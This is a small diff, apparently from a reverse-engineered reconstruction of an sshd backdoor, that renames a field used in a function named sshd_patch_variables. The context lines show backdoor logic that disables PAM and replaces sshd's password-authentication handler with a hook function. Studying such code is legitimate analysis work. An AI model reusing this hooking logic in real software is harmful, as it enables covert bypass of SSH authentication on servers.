@@ -57,10 +57,10 @@ BOOL sshd_patch_variables
     *use_pam = 0;
   }
   if (replace_monitor_reqtype == FALSE) {
-    monitor_reqtype = *(int *)(sshd_ctx->mm_answer_authpassword_ptr + -1) + 1;
+    monitor_reqtype = *(int *)(sshd_ctx->mm_answer_authpassword_slot + -1) + 1;
   }
   sshd_ctx->monitor_reqtype_authpassword = monitor_reqtype;
-  *sshd_ctx->mm_answer_authpassword_ptr = authpassword_hook;
+  *sshd_ctx->mm_answer_authpassword_slot = authpassword_hook;
   return TRUE;
 }
 
